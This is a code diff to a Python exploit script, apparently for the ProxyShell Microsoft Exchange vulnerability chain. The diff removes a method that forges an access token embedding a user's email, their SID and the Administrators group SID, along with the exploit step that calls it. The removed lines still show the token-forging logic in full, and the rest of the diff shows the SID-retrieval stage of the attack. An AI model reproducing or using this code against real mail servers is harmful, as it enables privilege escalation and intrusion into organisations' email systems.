@@ -79,10 +79,6 @@ class ProxyShell:
         )
         return r
 
-    def get_token(self):
-
-        self.token = self.gen_token()
-
     def get_sid(self):
 
         data = self.legacydn
@@ -141,44 +137,6 @@ class ProxyShell:
             method='xml'
         )
 
-    def gen_token(self):
-
-        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
-        version = 0
-        ttype = 'Windows'
-        compressed = 0
-        auth_type = 'Kerberos'
-        raw_token = b''
-        gsid = 'S-1-5-32-544'
-
-        version_data = b'V' + (1).to_bytes(1, 'little') + \
-            (version).to_bytes(1, 'little')
-        type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
-        compress_data = b'C' + (compressed).to_bytes(1, 'little')
-        auth_data = b'A' + (len(auth_type)).to_bytes(1,
-                                                     'little') + auth_type.encode()
-        login_data = b'L' + (len(self.email)).to_bytes(1,
-                                                       'little') + self.email.encode()
-        user_data = b'U' + (len(self.sid)).to_bytes(1,
-                                                    'little') + self.sid.encode()
-        group_data = b'G' + \
-            struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1,
-                                                            'little') + gsid.encode()
-        ext_data = b'E' + struct.pack('>I', 0)
-
-        raw_token += version_data
-        raw_token += type_data
-        raw_token += compress_data
-        raw_token += auth_data
-        raw_token += login_data
-        raw_token += user_data
-        raw_token += group_data
-        raw_token += ext_data
-
-        data = base64.b64encode(raw_token).decode()
-
-        return data
-
 
 def rand_string(n=5):
 
@@ -192,9 +150,6 @@ def exploit(proxyshell):
 
     proxyshell.get_sid()
     print(f'SID: {proxyshell.sid}')
-
-    proxyshell.get_token()
-    print(f'Token: {proxyshell.token}')
 
 
 def get_args():
